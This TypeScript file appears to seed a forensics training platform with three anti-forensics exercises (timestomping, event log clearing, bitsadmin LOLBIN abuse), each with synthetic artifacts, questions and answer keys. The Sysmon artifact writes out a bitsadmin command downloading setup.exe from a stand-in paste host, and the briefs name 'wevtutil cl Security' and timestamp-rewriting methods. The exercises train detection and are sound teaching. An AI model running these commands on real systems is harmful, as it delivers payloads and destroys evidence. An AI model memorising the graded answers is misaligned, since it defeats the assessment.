import { utf8 } from "./util";
import type { ScenarioSeed } from "./types";

// Anti-Forensics lane. Scenarios that train recognition of what
// attackers do to make a CDTI's job harder -- timestomping,
// log clearing, USN-journal wipes, LOLBINs masquerading as
// legitimate Windows binaries. The discipline focus is: read
// each technique by the trace it LEAVES, not the trace it
// removed.
//
// First slice ships three polished scenarios. Two more
// (memory-only payloads, steganography) are queued for a
// follow-up if these land.

export const ANTI_FORENSICS_SCENARIOS: ScenarioSeed[] = [
  // ─── 1. Timestomping detection ──────────────────────────────
  {
    slug: "anti-forensics-timestomping-mft-001",
    title: "Timestomping: $STANDARD_INFO vs $FILE_NAME",
    summary:
      "Two timestamps inside the MFT disagree on the same file. Read what each attribute tracks and identify which is the manipulated one.",
    skillAreas: ["anti_forensics", "windows_artifacts", "df_artifacts", "inference_discipline"],
    difficulty: 3,
    estimatedMinutes: 15,
    tags: ["anti_forensics", "timestomping", "mft", "windows_artifacts"],
    lane: "anti_forensics",
    module: "Timeline manipulation",
    sequence: 1,
    brief: `
# Brief

A suspect file recovered from a breached workstation looks recent
based on Explorer. The MFT extract tells a different story.

NTFS records two parallel timestamp sets per file:

- **\`$STANDARD_INFORMATION\` (\`$SI\`)** — the timestamps Explorer
  shows and that most user-space APIs can update. Trivially
  rewritable via SetFileTime() / tools like SetMACE, timestomp.exe,
  PowerShell \`(Get-Item).LastWriteTime = ...\`.
- **\`$FILE_NAME\` (\`$FN\`)** — the timestamps the NTFS driver
  writes into the directory-entry metadata when a file is created
  or renamed. **Not exposed by SetFileTime()**. Only updated by
  file-create and file-rename operations, and only by the kernel
  side of those operations.

When \`$SI\` and \`$FN\` disagree on a file that hasn't been
renamed since creation, it's a strong signal that someone
manipulated \`$SI\` after the fact.

Read the MFT extract. Decide what's been timestomped and what the
real activity window probably was.
`.trim(),
    artifacts: [
      {
        ordinal: 1,
        displayName: "mft-extract.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "MFT extract — selected entries (Eric Zimmerman MFTECmd output, abridged)",
            "Volume: C:    Path filter: \\Users\\m.holland\\Downloads\\",
            "",
            "Entry  98742    \\Users\\m.holland\\Downloads\\report-2024-q4-final.docx",
            "  $STANDARD_INFORMATION",
            "    Created             2024-03-15 09:42:11 UTC",
            "    Modified            2024-03-15 09:48:33 UTC",
            "    MFT Modified        2024-03-15 09:48:33 UTC",
            "    Accessed            2024-03-15 09:48:33 UTC",
            "  $FILE_NAME",
            "    Created             2024-03-15 09:42:11 UTC",
            "    Modified            2024-03-15 09:42:11 UTC",
            "    MFT Modified        2024-03-15 09:42:11 UTC",
            "    Accessed            2024-03-15 09:42:11 UTC",
            "",
            "Entry  98801    \\Users\\m.holland\\Downloads\\readme.txt",
            "  $STANDARD_INFORMATION",
            "    Created             2024-01-01 00:00:00 UTC",
            "    Modified            2024-01-01 00:00:00 UTC",
            "    MFT Modified        2024-12-19 22:14:51 UTC",
            "    Accessed            2024-01-01 00:00:00 UTC",
            "  $FILE_NAME",
            "    Created             2024-12-19 22:14:48 UTC",
            "    Modified            2024-12-19 22:14:48 UTC",
            "    MFT Modified        2024-12-19 22:14:48 UTC",
            "    Accessed            2024-12-19 22:14:48 UTC",
            "",
            "Entry  98802    \\Users\\m.holland\\Downloads\\install.exe",
            "  $STANDARD_INFORMATION",
            "    Created             2024-01-01 00:00:00 UTC",
            "    Modified            2024-01-01 00:00:00 UTC",
            "    MFT Modified        2024-12-19 22:14:52 UTC",
            "    Accessed            2024-01-01 00:00:00 UTC",
            "  $FILE_NAME",
            "    Created             2024-12-19 22:14:49 UTC",
            "    Modified            2024-12-19 22:14:49 UTC",
            "    MFT Modified        2024-12-19 22:14:49 UTC",
            "    Accessed            2024-12-19 22:14:49 UTC",
            "",
            "Notes from acquisition: image hash matches custody record;",
            "filesystem journal recovered cleanly.",
            "",
          ].join("\n"),
        ),
      },
    ],
    questions: [
      {
        ordinal: 1,
        type: "multi_choice",
        weight: 2,
        promptMd:
          "Which entries show evidence of timestamp manipulation? Select all that apply.",
        options: [
          {
            id: "report-stomp",
            label:
              "`report-2024-q4-final.docx` — $SI and $FN disagree on Modified, so the file was timestomped after creation.",
          },
          {
            id: "readme-stomp",
            label:
              "`readme.txt` — $SI shows 2024-01-01 but $FN shows 2024-12-19; $SI was backdated to look like an older legitimate file.",
          },
          {
            id: "install-stomp",
            label:
              "`install.exe` — same pattern as readme.txt: $SI backdated to 2024-01-01, $FN records the actual create at 2024-12-19.",
          },
          {
            id: "none-stomped",
            label:
              "None — the MFT extract is showing normal NTFS behaviour where $SI and $FN naturally diverge as the file is used.",
          },
        ],
        allowMultiple: true,
        expected: {
          type: "multi_choice",
          correctIds: ["readme-stomp", "install-stomp"],
          allowMultiple: true,
        },
        debriefMd: [
          "**Timestomped:**",
          "",
          "- `readme.txt` and `install.exe` both have $SI=Created=2024-01-01 but $FN=Created=2024-12-19. The kernel-side $FN reflects the actual create operation; the userland-rewritable $SI was set back to look like an older, less interesting file.",
          "",
          "**Not timestomped:**",
          "",
          "- `report-2024-q4-final.docx` shows a $SI/$FN difference on Modified only, which is **normal NTFS behaviour** when a file is created at time T and edited at time T+6min. $FN doesn't track in-place writes; it tracks creates and renames. So Created times match (both 2024-03-15 09:42:11) but Modified diverges because Word touched the file later. That's a normal life-cycle, not a manipulation.",
          "",
          "The trap in the first question is conflating \"$SI and $FN disagree\" with \"timestomped.\" $FN only tracks the kernel-side create and rename operations. A file edited in place will show $FN.Modified = $FN.Created (no update) and $SI.Modified = the real edit time — that's expected, not suspicious.",
        ].join("\n"),
      },
      {
        ordinal: 2,
        type: "text_match",
        weight: 1,
        promptMd:
          "What is the **actual creation date** of `install.exe`, in `YYYY-MM-DD` format?",
        textMatch: {
          acceptableAnswers: ["2024-12-19"],
          hint: "Look at the $FILE_NAME timestamps, not $STANDARD_INFORMATION.",
          hintAfterTries: 2,
        },
        expected: {
          type: "text_match",
          acceptableAnswers: ["2024-12-19"],
          regex: false,
        },
        debriefMd:
          "**2024-12-19.** The $FILE_NAME create timestamp is what the NTFS kernel driver wrote when the file came into existence. The $STANDARD_INFORMATION timestamp can be rewritten freely from userland and isn't trustworthy when stomping is on the table.",
      },
      {
        ordinal: 3,
        type: "confidence",
        weight: 1,
        promptMd:
          "Confidence (1–5) that the $FILE_NAME timestamps in this MFT extract are themselves trustworthy — i.e. that the attacker didn't manipulate those too.",
        expected: { type: "confidence", expectedRange: [3, 4] },
        debriefMd:
          "**3 or 4.** $FILE_NAME is much harder to manipulate than $SI — the documented userland API (`SetFileTime()`) doesn't touch it. Kernel-mode tooling (custom driver, raw NTFS writes via `\\\\.\\C:`) CAN rewrite $FN, but it requires SYSTEM-or-better and skills above the median attacker. So $FN is the right thing to lean on, but reserve 5 for cases where you've also corroborated against the USN journal or filesystem snapshots.",
      },
    ],
  },

  // ─── 2. Event Log clearing ──────────────────────────────────
  {
    slug: "anti-forensics-event-log-clearing-001",
    title: "Event Log Clearing: Reading What the Wipe Leaves Behind",
    summary:
      "The Security log is mostly empty for the week of interest. The clearing itself is logged. Read the Event 1102 + System log gaps and decide what attribution they support.",
    skillAreas: ["anti_forensics", "windows_artifacts", "df_artifacts", "inference_discipline"],
    difficulty: 3,
    estimatedMinutes: 15,
    tags: ["anti_forensics", "event_log", "wevtutil", "windows_artifacts"],
    lane: "anti_forensics",
    module: "Log destruction",
    sequence: 2,
    brief: `
# Brief

A Windows Server's Security log has a conspicuous absence. Almost
nothing recorded for the seven days leading up to the IR engagement.
The log isn't empty — there's a single Event ID 1102 right at the
boundary.

\`wevtutil cl Security\` (and the equivalent Event Viewer "Clear
Log" right-click) generates an Event ID 1102 in the Security
channel itself, recording the clear with the operator's SID, the
timestamp, and the channel name. The clear is destructive — the
events before it are gone — but the **fact of the clear** is
preserved as a single event in the now-mostly-empty log.

Read the artifacts. Decide what the clearing event proves and what
it doesn't, and what corroboration would harden the attribution.
`.trim(),
    artifacts: [
      {
        ordinal: 1,
        displayName: "security-log-tail.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "Security log — events for the 7 days preceding the IR pull",
            "Channel: Security    Source machine: SRV-FILE-04",
            "",
            "(only one event found in the window)",
            "",
            "Event ID   1102",
            "Source     Microsoft-Windows-Eventlog",
            "Channel    Security",
            "Time       2024-12-22 03:14:08 UTC",
            "User SID   S-1-5-21-1004336348-117234119-839522115-1183",
            "Domain     CORP",
            "User name  svc-backup",
            "Process    wevtutil.exe (PID 4720)",
            "Message    The audit log was cleared.",
            "",
            "[next event after this point is the IR analyst's account",
            "logging in at 2024-12-22 14:02:18 UTC]",
            "",
          ].join("\n"),
        ),
      },
      {
        ordinal: 2,
        displayName: "system-log-window.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "System log — events surrounding the Security clear",
            "Channel: System    Source machine: SRV-FILE-04",
            "",
            "Time                       Event   Source                       Message",
            "------------------------------------------------------------------------",
            "2024-12-22 03:13:12 UTC    7036    Service Control Manager      The Windows Event Log service entered the running state.",
            "2024-12-22 03:13:12 UTC    7036    Service Control Manager      The Windows Event Log service entered the stopped state.",
            "2024-12-22 03:13:09 UTC    104     Microsoft-Windows-Eventlog   The System log file was cleared.",
            "2024-12-22 03:12:51 UTC    7036    Service Control Manager      The Windows Event Log service entered the running state.",
            "",
            "(no other events from 03:12 onward, until)",
            "",
            "2024-12-22 14:02:09 UTC    7036    Service Control Manager      The Workstation service entered the running state.",
            "",
          ].join("\n"),
        ),
      },
      {
        ordinal: 3,
        displayName: "users-context.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "Account context (pulled from AD as part of the IR run)",
            "",
            "svc-backup                  S-1-5-21-...-1183",
            "    OU=Service Accounts",
            "    PrimaryGroup: Backup Operators",
            "    Last interactive logon (per LastLogonTimestamp):  2023-11-04",
            "    Password last set: 2023-11-04 (~14 months ago)",
            "    Note from owning team: account is used by the nightly Veeam",
            "    job. No human is supposed to ever interactively log in as",
            "    this account.",
            "",
          ].join("\n"),
        ),
      },
    ],
    questions: [
      {
        ordinal: 1,
        type: "multi_choice",
        weight: 2,
        promptMd:
          "Which of these statements are **directly supported** by the artifacts? Select all that apply.",
        options: [
          {
            id: "security-cleared",
            label:
              "The Security log on SRV-FILE-04 was cleared at 2024-12-22 03:14:08 UTC, and the clear was performed via `wevtutil.exe`.",
          },
          {
            id: "system-cleared",
            label:
              "The System log was also cleared just before the Security log clear, at 03:13:09 UTC — captured as Event 104 in the System channel.",
          },
          {
            id: "svc-backup-compromised",
            label:
              "The `svc-backup` account is compromised — the clearing was issued under that account, which is supposed to be non-interactive and exists only for the Veeam backup job.",
          },
          {
            id: "attacker-named",
            label:
              "The specific person who cleared the log is identified by the User SID in Event 1102.",
          },
          {
            id: "events-recovered",
            label:
              "The cleared events can be recovered from the log file itself because Event 1102 preserves the prior records as part of its message body.",
          },
        ],
        allowMultiple: true,
        expected: {
          type: "multi_choice",
          correctIds: ["security-cleared", "system-cleared", "svc-backup-compromised"],
          allowMultiple: true,
        },
        debriefMd: [
          "**Proven:**",
          "",
          "- *Security cleared at 03:14:08 by wevtutil.* Event 1102 is the canonical \"audit log cleared\" event and it preserves the clearing process + time.",
          "- *System cleared at 03:13:09.* Event 104 is the System-log equivalent. The Event Log service bounce on either side of it (7036) is consistent with the clear: the service has to stop and restart to release the open handle to the channel.",
          "- *svc-backup compromised.* The clearing was performed by an account that, per the owning team, is never supposed to be used interactively, and hasn't been in 14 months. The clear is incompatible with the account's intended use.",
          "",
          "**Not proven (over-claims):**",
          "",
          "- *Specific person identified.* Event 1102's User SID names the **account**, not the **person**. Service accounts are often shared, and the attacker may be using stolen credentials. Naming a person needs network + AD audit + interview.",
          "- *Cleared events can be recovered from the log.* Event 1102 records the clear; it does not embed the prior events. Recovery requires log-file shadow copies, SIEM forwarding, or VSS snapshots of the channel's .evtx file.",
        ].join("\n"),
      },
      {
        ordinal: 2,
        type: "multi_choice",
        weight: 1,
        promptMd:
          "Which corroborating sources would best recover the destroyed log content?",
        options: [
          { id: "wec", label: "Windows Event Collector (WEC) forwarder logs at the central collector — if forwarding was configured, the records were already off-host before the clear." },
          { id: "siem", label: "SIEM (Splunk, Sentinel, Elastic) ingest of the Security channel — same idea: events forwarded before the clear survive in the SIEM regardless of the host-side wipe." },
          { id: "vss", label: "Volume Shadow Copies of `C:\\Windows\\System32\\winevt\\Logs\\Security.evtx` — if VSS was active and a snapshot predates the clear, the channel file can be lifted from the snapshot." },
          { id: "more-event-log", label: "Read the Event Log file again on a different host — the events replicate across hosts in the domain, so any domain-joined system has them." },
          { id: "registry-evtx", label: "Read the Security registry hive — Windows mirrors the event log into the registry every 60 seconds as a recovery measure." },
        ],
        allowMultiple: true,
        expected: {
          type: "multi_choice",
          correctIds: ["wec", "siem", "vss"],
          allowMultiple: true,
        },
        debriefMd: [
          "WEC + SIEM + VSS are the three real recovery surfaces. The first two only help if forwarding was already configured before the incident; VSS only helps if a snapshot landed in the window between the events of interest and the clear.",
          "",
          "Event logs do **not** replicate across hosts, and there is no registry mirror. Both distractors describe features that don't exist.",
        ].join("\n"),
      },
      {
        ordinal: 3,
        type: "confidence",
        weight: 1,
        promptMd:
          "Confidence (1–5) that the attacker is a domain admin, based ONLY on these artifacts.",
        expected: { type: "confidence", expectedRange: [1, 2] },
        debriefMd:
          "**1 or 2.** Clearing the Security log on a single host requires SeSecurityPrivilege, which is held by Administrators on that host AND by Backup Operators (the group `svc-backup` is in). The artifacts here show a Backup Operator clear, which doesn't promote to domain admin without more evidence. Reserve high confidence for either explicit Domain Admin SID involvement, or evidence the same actor cleared logs across multiple hosts simultaneously.",
      },
    ],
  },

  // ─── 3. LOLBINs ─────────────────────────────────────────────
  {
    slug: "anti-forensics-lolbins-bitsadmin-001",
    title: "LOLBINs: bitsadmin Doing What bitsadmin Wasn't Made For",
    summary:
      "A signed Microsoft binary downloaded an executable from a Pastebin-style URL. The binary isn't malware. Read the command line and decide what the writeup actually supports.",
    skillAreas: ["anti_forensics", "malware_analysis", "windows_artifacts", "inference_discipline"],
    difficulty: 3,
    estimatedMinutes: 12,
    tags: ["anti_forensics", "lolbins", "bitsadmin", "windows_artifacts"],
    lane: "anti_forensics",
    module: "Living off the land",
    sequence: 3,
    brief: `
# Brief

Living-off-the-land binaries — **LOLBINs** — are legitimate, signed
Microsoft executables that attackers use to perform downloads,
execution, and persistence operations without dropping their own
custom tooling. The advantage to the attacker is twofold: signed
binaries don't trip allowlists, and EDR rules tuned to "watch for
suspicious processes" by name don't fire when the process is
\`bitsadmin.exe\` or \`certutil.exe\` or \`mshta.exe\`.

The discipline for the analyst: **read the command line, not the
binary name.** A signed binary doing exactly the thing it was
designed for is benign. The same binary used for a job outside its
intended scope is the case.

Sysmon Event ID 1 (ProcessCreate) captured this on the host.
Triage what it proves.
`.trim(),
    artifacts: [
      {
        ordinal: 1,
        displayName: "sysmon-event-1.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "Sysmon Event ID 1 — ProcessCreate",
            "Channel: Microsoft-Windows-Sysmon/Operational",
            "Source machine: WS-HRD-29",
            "",
            "Time            2024-12-15 11:47:23 UTC",
            "ProcessId       8412",
            "Image           C:\\Windows\\System32\\bitsadmin.exe",
            "FileVersion     10.0.19041.1 (WinBuild.160101.0800)",
            "Signed          true (Microsoft Windows)",
            "OriginalFileName  bitsadmin.exe",
            "CommandLine     bitsadmin.exe /transfer setup /download /priority foreground",
            "                http://files.example-paste.io/raw/a8b3f2d9 C:\\Users\\Public\\setup.exe",
            "User            CORP\\j.rivera",
            "ParentImage     C:\\Windows\\System32\\cmd.exe",
            "ParentCommandLine    cmd.exe /c \"\\\\fs01\\share\\onboarding\\setup-tools.bat\"",
            "Hashes          MD5=...  SHA256=2ebd... (matches Windows-signed bitsadmin)",
            "",
          ].join("\n"),
        ),
      },
      {
        ordinal: 2,
        displayName: "sysmon-event-3.txt",
        kind: "text",
        mimeType: "text/plain; charset=utf-8",
        bytes: utf8(
          [
            "Sysmon Event ID 3 — NetworkConnect",
            "Channel: Microsoft-Windows-Sysmon/Operational",
            "Source machine: WS-HRD-29",
            "",
            "Time            2024-12-15 11:47:24 UTC",
            "ProcessId       8412",
            "Image           C:\\Windows\\System32\\bitsadmin.exe",
            "User            CORP\\j.rivera",
            "Protocol        tcp",
            "DestinationIp   203.0.113.91",
            "DestinationHostname  files.example-paste.io",
            "DestinationPort 80",
            "Initiated       true",
            "",
          ].join("\n"),
        ),
      },
    ],
    questions: [
      {
        ordinal: 1,
        type: "multi_choice",
        weight: 2,
        promptMd:
          "Which statement best describes what the Sysmon events **directly support**?",
        options: [
          {
            id: "bitsadmin-malware",
            label:
              "`bitsadmin.exe` is a piece of malware that disguises itself as a signed Windows binary; the hash match against the legitimate version proves the OS file was replaced.",
          },
          {
            id: "tool-used-for-download",
            label:
              "A signed Microsoft binary (`bitsadmin.exe`) was used to download `setup.exe` from a Pastebin-style URL into `C:\\Users\\Public\\`. The binary itself isn't malicious; the command line is using it for an attacker-favoured download path.",
          },
          {
            id: "user-was-tricked",
            label:
              "`j.rivera` was tricked into manually running `bitsadmin.exe` — the user-initiated `cmd.exe` parent is proof the user typed the command interactively.",
          },
          {
            id: "host-clean",
            label:
              "The host is clean — `bitsadmin.exe` is a signed Microsoft binary, so any activity attributed to it is by definition legitimate Windows behaviour.",
          },
        ],
        allowMultiple: false,
        expected: {
          type: "multi_choice",
          correctIds: ["tool-used-for-download"],
          allowMultiple: false,
        },
        debriefMd: [
          "**The signed binary was used for a download to an attacker-favoured destination.** That's exactly what the events show, and it's the canonical LOLBIN pattern.",
          "",
          "**Why not the others:**",
          "",
          "- *Malware in disguise* — wrong. The hash matches the legitimate Windows version. LOLBIN abuse uses the **real** signed binary; that's the whole point.",
          "- *User manually typed it* — overclaim. The parent is a batch file (`setup-tools.bat`) executed via `cmd.exe /c`. That batch file could have been triggered by anything — a logon script, a scheduled task, a malicious shortcut. The events don't show interactive typing.",
          "- *Signed = legitimate* — the canonical anti-forensic misread the lane trains against. Signed only means \"the binary is what Microsoft shipped.\" It says nothing about whether the **use** of the binary is legitimate.",
        ].join("\n"),
      },
      {
        ordinal: 2,
        type: "multi_choice",
        weight: 1,
        promptMd:
          "Which artifacts would best determine **what `setup.exe` actually is**?",
        options: [
          { id: "hash-setup", label: "Compute the SHA-256 of `C:\\Users\\Public\\setup.exe` and pivot against threat-intel feeds (VirusTotal, internal sample collection)." },
          { id: "static-pe", label: "Static PE triage of `setup.exe` — imports, strings, sections, entropy, embedded signatures." },
          { id: "sandbox", label: "Sandbox detonation of `setup.exe` in CAPE / Joe / Hybrid Analysis with the same parent-process context if possible." },
          { id: "sign-bitsadmin", label: "Re-verify the signature on `bitsadmin.exe` itself; if it's still Microsoft-signed, the OS binary hasn't been swapped and we don't need to look at `setup.exe`." },
          { id: "user-interview", label: "Interview `j.rivera` about whether they ran an onboarding tool earlier in the day; their answer determines whether the host is in scope." },
        ],
        allowMultiple: true,
        expected: {
          type: "multi_choice",
          correctIds: ["hash-setup", "static-pe", "sandbox"],
          allowMultiple: true,
        },
        debriefMd: [
          "Hash + static triage + sandbox detonation are the three standard moves for triaging a suspect dropped binary.",
          "",
          "**Wrong:**",
          "",
          "- *Re-verify bitsadmin's signature* — bitsadmin's signature isn't the question. The case is what `setup.exe` is. Re-verifying the LOLBIN tells you about the wrong file.",
          "- *Interview the user* — appropriate eventually, but it doesn't determine what `setup.exe` IS. A clean user interview (\"I didn't run that\") is information about attribution, not about the binary's nature.",
        ].join("\n"),
      },
      {
        ordinal: 3,
        type: "confidence",
        weight: 1,
        promptMd:
          "Confidence (1–5) that `j.rivera` knowingly triggered this download.",
        expected: { type: "confidence", expectedRange: [1, 2] },
        debriefMd:
          "**1 or 2.** The Sysmon events show the process tree (`cmd.exe` → `bitsadmin.exe`) and the user the process ran as (`j.rivera`). They don't show whether `j.rivera` typed the command, clicked a shortcut, opened a phishing attachment that staged the batch file, or had nothing to do with it because a malicious scheduled task ran under their session. Naming intent needs interview + UserAssist + scheduled-task / shortcut artifacts + the path of `setup-tools.bat` resolving to something explainable.",
      },
    ],
  },
];
